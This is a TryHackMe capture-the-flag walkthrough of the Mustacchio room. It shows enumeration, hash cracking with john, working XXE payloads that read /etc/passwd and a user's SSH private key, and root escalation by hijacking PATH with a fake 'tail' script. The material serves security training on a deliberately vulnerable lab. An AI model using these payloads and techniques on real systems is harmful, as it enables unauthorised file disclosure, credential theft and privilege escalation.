## TryHackMe Mustacchio Walkthrough

I used the TryHackMe AttackBox to work through the [Mustacchio](https://tryhackme.com/room/mustacchio) room.

Once the room and Mustacchio machine booted up, I ran the following `nmap` scan of the first 10,000 ports: `nmap -sV --script default,vuln,http-enum -p 1-10000 10.10.166.116`.  Results:

```
Nmap scan report for ip-10-10-166-116.eu-west-1.compute.internal (10.10.166.116)
Host is up (0.00072s latency).
Not shown: 9997 filtered ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 58:1b:0c:0f:fa:cf:05:be:4c:c0:7a:f1:f1:88:61:1c (RSA)
|   256 3c:fc:e8:a3:7e:03:9a:30:2c:77:e0:0a:1c:e4:52:e6 (ECDSA)
|_  256 9d:59:c6:c7:79:c5:54:c4:1d:aa:e4:d1:84:71:01:92 (EdDSA)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=ip-10-10-166-116.eu-west-1.compute.internal
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://ip-10-10-166-116.eu-west-1.compute.internal/contact.html
|     Form id: fname
|_    Form action: contact.html
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /robots.txt: Robots file
|   /custom/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
|_  /images/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
| http-internal-ip-disclosure: 
|_  Internal IP Leaked: 127.0.0.1
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       http://ha.ckers.org/slowloris/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-title: Mustacchio | Home
8765/tcp open  http    nginx 1.10.3 (Ubuntu)
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=ip-10-10-166-116.eu-west-1.compute.internal
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://ip-10-10-166-116.eu-west-1.compute.internal:8765/
|     Form id: 
|_    Form action: auth/login.php
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-server-header: nginx/1.10.3 (Ubuntu)
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-title: Mustacchio | Login
MAC Address: 02:96:92:55:61:33 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Ports 22, 80, and 8765 were open.  First I started by looking at the page at port 80:

![](/img/tryhackme/mustacchio/mustacchio_home_page.png)

Nmap indicated one disallowed entry in the `robots.txt` file, but it was just `/`.  There was also a `/custom/` directory on port 80, and in `/custom/js/` there was a file `users.bak`.  I downloaded the file, and ran `file users.bak`, which gave me `SQLite 3.x database, last written using SQLite version 3034001`.  Turns out it's a sqlite3 file.  I opened it in `sqlite3` and found a table `users` with one entry, the user `admin` with a password hash:  

![](/img/tryhackme/mustacchio/mustacchio_users_bak.png)

I put this hash into a file `hash.txt` and tried to crack it with `john` using the command `john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt`, and I got the password:

![](/img/tryhackme/mustacchio/mustacchio_john_crack_users_bak.png)

I tried to ssh with this user but got a `Permission denied (publickey)` error, so these weren't SSH credentials.  From nmap I discovered earlier another HTTP service open on port 8765, which had a login page:

![](/img/tryhackme/mustacchio/mustacchio_admin_panel_login.png)

I tried the credentials there and successfully logged in.  This took me to an admin panel with a single input:

![](/img/tryhackme/mustacchio/mustacchio_admin_panel.png)

I looked through the source code and found a script with a reference to a `/auth/dontforget.bak` file, as well as a comment to Barry about his SSH key:

![](/img/tryhackme/mustacchio/mustacchio_admin_source_code.png)

The `dontforget.bak` file turned out to contain XML code:

![](/img/tryhackme/mustacchio/mustacchio_dontforget.png)

In the input field I had found, I entered some text in the input and clicked Submit, after which I saw a result at the bottom with name, author, and comment fields:

![](/img/tryhackme/mustacchio/mustacchio_admin_panel_result.png)

I also tried clicking Submit with nothing in the text input, which gave an alert message telling me to put in XML code:

![](/img/tryhackme/mustacchio/mustacchio_admin_panel_blank.png)

I used the XML code from `dontforget.bak`, and the page filled in the name, author, and comment:

![](/img/tryhackme/mustacchio/mustacchio_admin_panel_xml.png)

This field looked worth testing for XXE vulnerabilities.  Using the following payload displayed the contents of the server's `/etc/passwd` file:

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "/etc/passwd"> ]>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>&xxe;</com>
</comment>
```

![](/img/tryhackme/mustacchio/mustacchio_admin_panel_xxe_etc_passwd.png)

From this output I saw there were users `joe` and `barry`, and I tried modifying the above payload to see if I could get a result for a `user.txt` file.  Turns out that replacing `/etc/passwd` with `/home/barry/user.txt` gave me the first flag.

![](/img/tryhackme/mustacchio/mustacchio_user_flag.png)

Given the source code comment earlier about Barry's SSH key, I tried to get Barry's SSH key at `/home/barry/.ssh/id_rsa` and was able to retrieve it.  I base64 encoded it first, to maintain the proper formatting, with the following payload:

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/home/barry/.ssh/id_rsa"> ]>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>&xxe;</com>
</comment>
```

I then base64 decoded the string, and saved it to a file `id_rsa` and updated its permissions with `chmod 600 id_rsa`.  The key required a passphrase however, so I used the `/opt/john/ssh2john.py` program to get a hash from the SSH key, running the command `/opt/john/ssh2john.py id_rsa > ssh_hash.txt`. I then ran `john ssh_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt` to crack the hash, giving me the key password:

![](/img/tryhackme/mustacchio/mustacchio_ssh_key_passphrase_john.png)

I was able to use the key and passphrase to log in as `barry`, starting me at `/home/barry` on the server.  I had already seen the flag in `/home/barry/user.txt`.

After looking around in barry's and joe's home directories, I found a `live_log` program in `/home/joe/` that had SUID permissions as root.  After running `strings live_log`, I found the string `tail -f /var/log/nginx/access.log`. Since it looked like this program ran `tail`, I figured I could create my own version of `tail` in `/tmp` and update `PATH` to use my version of `tail` as `root` when running `live_log`.  I made a program `/tmp/tail` with the following code:

```
#!/bin/bash

/bin/bash
```

I then updated its permissions with `chmod +x /tmp/tail`, updated `PATH` to have `/tmp` first using the command `export PATH=/tmp:$PATH`, then ran the `live_log` program.  This escalated my privileges to root, and from here I was able to find and view the root flag:

![](/img/tryhackme/mustacchio/mustacchio_priv_esc.png)
